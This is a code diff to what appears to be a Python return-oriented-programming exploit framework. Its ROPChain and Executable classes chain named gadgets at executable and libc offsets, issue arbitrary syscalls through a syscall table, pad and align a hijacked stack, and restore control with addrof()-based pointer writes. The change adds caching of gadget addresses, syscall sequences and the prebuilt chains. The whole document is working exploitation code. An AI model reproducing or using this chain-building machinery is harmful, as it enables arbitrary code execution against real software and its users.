@@ -32,6 +32,13 @@ class ROPChain(object):
         self.errno_buf = alloc(4)
         self.errno_addr = get_ref_addr(self.errno_buf)
         self.index = 0
+        self.gadget_cache = {}
+        self.padding = None
+        self.front = None
+        self.post = None
+        self.back = None
+        self.syscall_cache = {}
+        self.r9_zero_container = None
 
     @property
     def return_value(self):
@@ -47,13 +54,6 @@ class ROPChain(object):
 
     def reset(self):
         self.index = 0
-        self.chain[:] = b"\0" * len(self.chain)
-
-    def append(self, value):
-        if self.index + 8 > len(self.chain):
-            raise Exception("ROP chain overflow")
-        self.chain[self.index : self.index + 8] = struct.pack("<Q", value)
-        self.index += 8
 
     def extend(self, buf):
         if self.index + len(buf) > len(self.chain):
@@ -61,18 +61,41 @@ class ROPChain(object):
         self.chain[self.index : self.index + len(buf)] = buf
         self.index += len(buf)
 
-    def push_gadget(self, gadget_name):
-        if gadget_name not in SELECTED_GADGETS:
-            raise Exception("Gadget %s not found" % gadget_name)
-
-        self.append(
-            (
+    def gadget_addr(self, gadget_name):
+        cached = self.gadget_cache.get(gadget_name)
+        if cached is None:
+            if gadget_name not in SELECTED_GADGETS:
+                raise Exception("Gadget %s not found" % gadget_name)
+            cached = (
                 self.sc.exec_addr
                 if gadget_name not in LIBC_GADGETS
                 else self.sc.libc_addr
-            )
-            + SELECTED_GADGETS[gadget_name]
-        )
+            ) + SELECTED_GADGETS[gadget_name]
+            self.gadget_cache[gadget_name] = cached
+        return cached
+
+    def push_gadget(self, gadget_name):
+        self.append(self.gadget_addr(gadget_name))
+
+    def padding_bytes(self):
+        block = self.padding
+        if block is None:
+            block = struct.pack("<Q", self.gadget_addr("add rsp, 0x1b8; ret")) + b"\x00" * 440
+            self.padding = block
+        return block
+
+    def front_bytes(self):
+        block = self.front
+        if block is None:
+            block = b"\x00" * 8 + self.padding_bytes() * 16
+            self.front = block
+        return block
+
+    def append(self, value):
+        if self.index + 8 > len(self.chain):
+            raise Exception("ROP chain overflow")
+        self.chain[self.index : self.index + 8] = struct.pack("<Q", value)
+        self.index += 8
 
     def push_value(self, value):
         self.append(value)
@@ -82,9 +105,16 @@ class ROPChain(object):
             self.push_gadget("pop r9; ret")
             self.push_value(r9)
         else:
-            r9_container = alloc(0x20)
-            r9_container_addr = get_ref_addr(r9_container)
-            r9_container[0x18:0x20] = p64a(r9)
+            if r9 == 0:
+                container = self.r9_zero_container
+                if container is None:
+                    container = alloc(0x20)
+                    self.r9_zero_container = container
+                r9_container_addr = get_ref_addr(container)
+            else:
+                r9_container = alloc(0x20)
+                r9_container_addr = get_ref_addr(r9_container)
+                r9_container[0x18:0x20] = p64a(r9)
             self.push_gadget("pop rax; ret")
             self.push_value(r9_container_addr)
             self.push_gadget("pop rsi; ret")
@@ -95,7 +125,13 @@ class ROPChain(object):
 
     def push_syscall(self, syscall_number, rdi=0, rsi=0, rdx=0, rcx=0, r8=0, r9=0):
         (rdi, rsi, rdx, rcx, r8, r9) = convert_regs_to_int(rdi, rsi, rdx, rcx, r8, r9)
+        key = (syscall_number, rdi, rsi, rdx, rcx, r8, r9)
+        cached = self.syscall_cache.get(key)
+        if cached is not None:
+            self.extend(cached)
+            return
 
+        start = self.index
         self._push_r9_setup(r9)
         self.push_gadget("pop rax; ret")
         self.push_value(syscall_number)
@@ -113,6 +149,7 @@ class ROPChain(object):
             self.push_value(self.sc.syscall_addr)
         else:
             self.push_value(self.sc.syscall_table[syscall_number])
+        self.syscall_cache[key] = bytes(self.chain[start : self.index])
 
     def push_call(self, addr, rdi=0, rsi=0, rdx=0, rcx=0, r8=0, r9=0):
         (rdi, rsi, rdx, rcx, r8, r9) = convert_regs_to_int(rdi, rsi, rdx, rcx, r8, r9)
@@ -203,11 +240,7 @@ class Executable(object):
         return self.chain.errno
 
     def setup_front_chain(self):
-        self.chain.push_value(0)
-
-        # add bunch of padding to align the stack
-        for _ in range(16):
-            self.setup_padding_chain()
+        self.chain.extend(self.chain.front_bytes())
 
     def setup_call_chain(self, func_addr, rdi=0, rsi=0, rdx=0, rcx=0, r8=0, r9=0):
         self.chain.push_call(
@@ -222,24 +255,31 @@ class Executable(object):
         )
 
     def setup_padding_chain(self):
-        # padding to align the stack
-        self.chain.push_gadget("add rsp, 0x1b8; ret")
-        for _ in range(55):
-            self.chain.push_value(0)
+        self.chain.extend(self.chain.padding_bytes())
 
     def setup_post_chain(self):
-        self.chain.push_get_return_value()
-        self.chain.push_get_errno()
+        if self.chain.post is None:
+            start = self.chain.index
+            self.chain.push_get_return_value()
+            self.chain.push_get_errno()
+            self.chain.post = bytes(self.chain.chain[start : self.chain.index])
+        else:
+            self.chain.extend(self.chain.post)
 
     def setup_back_chain(self):
-        self.chain.push_gadget("pop r8; ret")
-        self.chain.push_value(addrof(None) + 0x7D)
-        self.chain.push_gadget("pop rcx; ret")
-        self.chain.push_value(1)
-        self.chain.push_gadget("add [r8 - 0x7d], rcx; ret")
-        self.chain.push_gadget("pop rax; ret")
-        self.chain.push_value(addrof(None))
-        self.chain.push_gadget("mov rsp, rbp; pop rbp; ret")
+        if self.chain.back is None:
+            start = self.chain.index
+            self.chain.push_gadget("pop r8; ret")
+            self.chain.push_value(addrof(None) + 0x7D)
+            self.chain.push_gadget("pop rcx; ret")
+            self.chain.push_value(1)
+            self.chain.push_gadget("add [r8 - 0x7d], rcx; ret")
+            self.chain.push_gadget("pop rax; ret")
+            self.chain.push_value(addrof(None))
+            self.chain.push_gadget("mov rsp, rbp; pop rbp; ret")
+            self.chain.back = bytes(self.chain.chain[start : self.chain.index])
+        else:
+            self.chain.extend(self.chain.back)
 
     def execute(self):
         self.call_func()
